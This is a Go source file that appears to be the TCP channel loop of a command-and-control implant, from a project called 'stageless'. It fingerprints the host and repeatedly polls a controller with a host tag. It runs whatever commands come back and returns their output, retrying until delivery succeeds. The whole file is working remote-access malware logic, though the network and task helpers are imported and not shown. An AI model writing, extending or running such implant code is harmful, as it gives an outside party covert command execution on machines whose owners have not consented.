package routine

import (
	"stageless/capabilities"
	"stageless/utils/actions"
	global "stageless/utils"
	"stageless/utils/network"
	"stageless/utils/tasks"
)

func returnTCPOutput() {
	// Sends the pending tcp output and retries until delivery succeeds
	if !tasks.CheckOutput() {
		return
	}
	batch := tasks.GetOutput()
	sent := network.SendTCPBatch(batch)
	for !sent.OK {
		capabilities.Sleep_now()
		actions.SendFingerprint()
		sent = network.SendTCPBatch(batch)
	}
	if actions.IsMissingHostResponse(sent.Body) {
		actions.SendFingerprint()
	}
	tasks.ClearTasks(sent.OK, sent.Body)
}

func TCPMain() {
	// Main function of the tcp channel loop
	actions.SendFingerprint()
	for {
		boot := network.SendTCPRequest(global.HostTag)
		for !boot.OK {
			capabilities.Sleep_now()
			boot = network.SendTCPRequest(global.HostTag)
		}
		if boot.Code == 200 {
			break
		}
		if actions.IsMissingHostResponse(boot.Body) {
			actions.SendFingerprint()
		}
		capabilities.Sleep_now()
	}
	for {
		returnTCPOutput()
		capabilities.Sleep_now()
		resp := network.SendTCPRequest(global.HostTag)
		for !resp.OK {
			capabilities.Sleep_now()
			actions.SendFingerprint()
			resp = network.SendTCPRequest(global.HostTag)
		}
		if actions.IsMissingHostResponse(resp.Body) {
			actions.SendFingerprint()
		} else if network.HasTransportCommands(resp) {
			tasks.RunCommand(resp.Body)
			returnTCPOutput()
		}
		if global.SecondDelayEnabled != 0 {
			capabilities.Sleep_now(global.SecondDelay)
			returnTCPOutput()
		}
	}
}
